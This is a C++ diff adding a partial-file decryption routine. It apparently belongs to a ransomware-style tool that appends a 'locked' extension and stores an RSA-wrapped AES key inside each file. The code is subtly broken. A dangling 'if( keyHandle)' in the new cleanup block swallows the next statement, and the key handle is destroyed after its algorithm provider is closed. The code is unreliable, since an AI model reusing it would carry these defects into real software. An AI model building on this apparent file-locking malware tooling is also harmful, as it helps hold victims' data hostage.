@@ -107,7 +107,125 @@ DECCLEAN:
 		HeapFree(GetProcessHeap(), 0, tmpIv);
 	if (plainText)
 		HeapFree(GetProcessHeap(), 0, plainText);
+	if (aesHandle)
+		BCryptCloseAlgorithmProvider(aesHandle, 0);
+	if (keyHandle)
+		BCryptDestroyKey(keyHandle);
 	return status;
+}
+
+void partialDecrypt(string path, RsaDecryptor& rsaDecryptor)
+{
+	long padding;
+	PBYTE encKeyIv = nullptr;
+	PBYTE keyIv = nullptr;
+	PBYTE tmpIv = nullptr;
+	PBYTE cipher = nullptr;
+	PBYTE plainText = nullptr;
+	BCRYPT_KEY_HANDLE keyHandle = nullptr;
+	BCRYPT_ALG_HANDLE aesHandle = nullptr;
+	std::ofstream outFile;
+	std::ifstream ifile;
+
+	size_t block = BIG_FILE_BLOCK_SIZE;
+	size_t cipherSize = BIG_FILE_BLOCK_SIZE;
+	string plainPath = path;
+	string::size_type i = plainPath.find(PART_LOCKED_EXT);
+	if(string::npos != i)
+	{
+		plainPath.erase(i, string(PART_LOCKED_EXT).size());
+	}
+	encKeyIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, ENCRYPTED_KEY_IV_LEN);
+	if(!encKeyIv)
+	{
+		goto PART_DEC_CLEANUP;
+	}
+
+	myCopyFiles(path, 0, block, plainPath, 0);
+	
+
+	ifile.open(path, std::ios::binary);
+	if(!ifile.is_open())
+	{
+		goto PART_DEC_CLEANUP;
+	}
+	ifile.seekg(block);
+	char paddingSizeTmpBuff[IV_DIGITS_NUM + 1] = { 0 };
+	ifile.read(paddingSizeTmpBuff, IV_DIGITS_NUM);
+	size_t paddingSize = strtol(paddingSizeTmpBuff, NULL, 10);
+	ifile.read((char*)encKeyIv, ENCRYPTED_KEY_IV_LEN);
+	cipherSize += paddingSize;
+	cipher = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cipherSize);
+	if (!cipher)
+	{
+		goto PART_DEC_CLEANUP;
+	}
+	ifile.read((char*)cipher, cipherSize);
+	ifile.close();
+
+	keyIv = rsaDecryptor.decrypt(encKeyIv);
+	if(!keyIv)
+	{
+		goto PART_DEC_CLEANUP;
+	}
+	PBYTE iv = keyIv + KEY_LEN;
+
+	if(!NT_SUCCESS(getKeyHandle(keyIv,keyHandle,aesHandle)))
+	{
+		goto PART_DEC_CLEANUP;
+	}
+	tmpIv = (PBYTE)HeapAlloc(GetProcessHeap(), 0, IV_LEN);
+	if (NULL == tmpIv) {
+		goto PART_DEC_CLEANUP;
+	}
+	memcpy(tmpIv, iv, IV_LEN);
+	Status status;
+	DWORD plainSize, resSize;
+	status = BCryptDecrypt(keyHandle, cipher, cipherSize, NULL, tmpIv, IV_LEN, NULL, 0, &plainSize, BCRYPT_BLOCK_PADDING);
+	if (!NT_SUCCESS(status)) {
+		goto PART_DEC_CLEANUP;
+	}
+	plainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, plainSize);
+	if (NULL == plainText) {
+		goto PART_DEC_CLEANUP;
+	}
+	status = BCryptDecrypt(keyHandle, cipher, cipherSize, NULL, iv, IV_LEN, plainText, plainSize, &resSize, BCRYPT_BLOCK_PADDING);
+	if (!NT_SUCCESS(status)) {
+		goto PART_DEC_CLEANUP;
+	}
+	outFile.open(plainPath, std::ios::binary | std::fstream::app);
+	if(!outFile.is_open())
+	{
+		goto PART_DEC_CLEANUP;
+	}
+	outFile.seekp(block);
+	outFile.write((char*)plainText, resSize);
+	size_t currentPos = outFile.tellp();
+	outFile.close();
+	myCopyFiles(path, block + ENCRYPTED_KEY_IV_LEN + 2 + cipherSize, getFileSize(path),
+		plainPath, currentPos);
+
+PART_DEC_CLEANUP:
+	 if( encKeyIv)
+		 HeapFree(GetProcessHeap(),0, encKeyIv);
+	if( keyIv)
+		HeapFree(GetProcessHeap(), 0, keyIv);
+	if (tmpIv)
+		HeapFree(GetProcessHeap(), 0, tmpIv);
+	if( cipher)
+		HeapFree(GetProcessHeap(), 0, cipher);
+	if( plainText)
+		HeapFree(GetProcessHeap(), 0, plainText);
+	if( keyHandle)
+		
+	if (aesHandle)
+		BCryptCloseAlgorithmProvider(aesHandle, 0);
+	if (keyHandle)
+		BCryptDestroyKey(keyHandle);
+	if (outFile.is_open())
+		outFile.close();
+	if (ifile.is_open())
+		ifile.close();
 }
 
 Status decrypt_wrapper(string path, RsaDecryptor& rsaDecryptor)
@@ -238,6 +356,8 @@ static void iterate(const path& parent, RsaDecryptor& rsaDecryptor) {
 		}
 	}
 }
+
+
 
 int decryption_main()
 {
